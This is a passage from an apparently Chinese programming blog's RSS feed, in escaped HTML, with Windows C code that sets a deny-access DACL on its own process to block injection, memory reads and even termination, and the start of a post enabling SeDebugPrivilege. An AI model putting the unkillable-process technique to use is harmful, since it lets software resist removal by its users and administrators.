align=top&gt;&amp;nbsp;&amp;nbsp;HANDLE&amp;nbsp;hToken;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;12&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;bSus&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;::OpenProcessToken(hProcess,TOKEN_QUERY,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;amp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;hToken);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;13&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;!&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;bSus)&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;goto&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;Cleanup;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;14&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;dwReturnLength;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;15&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;::GetTokenInformation(hToken,TokenUser,NULL,NULL,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;amp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;dwReturnLength);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;16&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(dwReturnLength&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0x400&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;)&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;goto&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;Cleanup;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;17&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;LPVOID&amp;nbsp;TokenInformation;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;18&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;TokenInformation&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;::LocalAlloc(LPTR,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0x400&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;);&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;//&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;这里就引用SDK的函数不引用CRT的了&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;19&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;dw;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;20&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;bSus&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;::GetTokenInformation(hToken,TokenUser,TokenInformation,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0x400&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;amp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;dw);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;21&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;!&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;bSus)&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;goto&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;Cleanup;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;22&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;PTOKEN_USER&amp;nbsp;pTokenUser&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;(PTOKEN_USER)TokenInformation;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;23&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;BYTE&amp;nbsp;Buf[&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0x200&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;];&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;24&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;PACL&amp;nbsp;pAcl&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;(PACL)&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;amp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;Buf;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;25&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;bSus&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;::InitializeAcl(pAcl,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;1024&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;,ACL_REVISION);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;26&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;!&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;bSus)&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;goto&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;Cleanup;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;27&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;bSus&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;::AddAccessDeniedAce(pAcl,ACL_REVISION,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0x000000FA&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;,pSid);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;28&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;!&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;bSus)&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;goto&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;Cleanup;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;29&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;bSus&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;::AddAccessAllowedAce(pAcl,ACL_REVISION,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0x00100701&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;,pTokenUser&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;-&amp;gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;User.Sid);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;30&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;!&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;bSus)&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;goto&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;Cleanup;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;31&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(::SetSecurityInfo(hProcess,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;|&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;PROTECTED_DACL_SECURITY_INFORMATION,NULL,NULL,pAcl,NULL)&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;==&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;)&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;32&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;bSus&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;TRUE;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;33&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;Cleanup:&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;34&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(hProcess&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;!=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;NULL)&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;35&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;::CloseHandle(hProcess);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;36&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(pSid&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;!=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;NULL)&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;37&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;::FreeSid(pSid);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;38&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;return&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;bSus;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;39&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/ExpandedBlockEnd.gif" align=top&gt;}&lt;/SPAN&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;40&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/None.gif" align=top&gt;&lt;/SPAN&gt;&lt;/DIV&gt;
&lt;P&gt;&lt;BR&gt;这段代码就可以锁住其他进程打开本进程,当然也就防止了注入,和读写内存.&lt;/P&gt;
&lt;P&gt;可以更绝点Denied ALL ACCESS(0xFFFFFFFF)就连结束都不可能了&lt;/P&gt;
&lt;P&gt;::AllocateAndInitializeSid 可以换成 :: InitializeSid .因为我们并不需要初始化子Sid.&lt;BR&gt;另外.&lt;BR&gt;&amp;nbsp; bSus = ::AddAccessDeniedAce(pAcl,ACL_REVISION,0x000000FA,pSid);&lt;BR&gt;&amp;nbsp; if(!bSus) goto Cleanup;&lt;BR&gt;&amp;nbsp; bSus = ::AddAccessAllowedAce(pAcl,ACL_REVISION,0x00100701,pTokenUser-&amp;gt;User.Sid);&lt;BR&gt;实际上只需要下面的一句,或者干脆把它去掉,因为如果不添加Ace默认就是没有权限.既然这样上面的那句话AllocateAndInitializeSid 也可以省掉,也似乎有些多余 &lt;BR&gt;&lt;/P&gt;</description></item><item><title>权限提升代码</title><link>https://blogs.qipai360.cn/post/privilege-escalation-code/</link><pubDate>Wed, 22 Aug 2007 09:41:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/privilege-escalation-code/</guid><description>&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt" id="hl-0-1"&gt;&lt;a class="lnlinks" href="#hl-0-1"&gt; 1&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-2"&gt;&lt;a class="lnlinks" href="#hl-0-2"&gt; 2&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-3"&gt;&lt;a class="lnlinks" href="#hl-0-3"&gt; 3&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-4"&gt;&lt;a class="lnlinks" href="#hl-0-4"&gt; 4&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-5"&gt;&lt;a class="lnlinks" href="#hl-0-5"&gt; 5&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-6"&gt;&lt;a class="lnlinks" href="#hl-0-6"&gt; 6&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-7"&gt;&lt;a class="lnlinks" href="#hl-0-7"&gt; 7&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-8"&gt;&lt;a class="lnlinks" href="#hl-0-8"&gt; 8&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-9"&gt;&lt;a class="lnlinks" href="#hl-0-9"&gt; 9&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-10"&gt;&lt;a class="lnlinks" href="#hl-0-10"&gt;10&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-11"&gt;&lt;a class="lnlinks" href="#hl-0-11"&gt;11&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-12"&gt;&lt;a class="lnlinks" href="#hl-0-12"&gt;12&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-13"&gt;&lt;a class="lnlinks" href="#hl-0-13"&gt;13&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-14"&gt;&lt;a class="lnlinks" href="#hl-0-14"&gt;14&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-15"&gt;&lt;a class="lnlinks" href="#hl-0-15"&gt;15&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-16"&gt;&lt;a class="lnlinks" href="#hl-0-16"&gt;16&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-17"&gt;&lt;a class="lnlinks" href="#hl-0-17"&gt;17&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-18"&gt;&lt;a class="lnlinks" href="#hl-0-18"&gt;18&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-19"&gt;&lt;a class="lnlinks" href="#hl-0-19"&gt;19&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-20"&gt;&lt;a class="lnlinks" href="#hl-0-20"&gt;20&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-21"&gt;&lt;a class="lnlinks" href="#hl-0-21"&gt;21&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-22"&gt;&lt;a class="lnlinks" href="#hl-0-22"&gt;22&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-23"&gt;&lt;a class="lnlinks" href="#hl-0-23"&gt;23&lt;/a&gt;
&lt;/span&gt;&lt;span class="lnt" id="hl-0-24"&gt;&lt;a class="lnlinks" href="#hl-0-24"&gt;24&lt;/a&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;AdjustPrivilege&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;BOOL&lt;/span&gt; &lt;span class="n"&gt;bEnable&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HANDLE&lt;/span&gt; &lt;span class="n"&gt;hProcess&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HANDLE&lt;/span&gt; &lt;span class="n"&gt;hToken&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;TOKEN_PRIVILEGES&lt;/span&gt; &lt;span class="n"&gt;tkp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;tkp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PrivilegeCount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;tkp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Privileges&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;Attributes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bEnable&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;tkp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Privileges&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;Attributes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SE_PRIVILEGE_ENABLED&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;LookupPrivilegeValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;SeDebugPrivilege&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;tkp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Privileges&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;Luid&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hProcess&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;OpenProcess&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PROCESS_ALL_ACCESS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FALSE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;OpenProcessToken&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hProcess&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TOKEN_ADJUST_PRIVILEGES&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;TOKEN_QUERY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;hToken&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
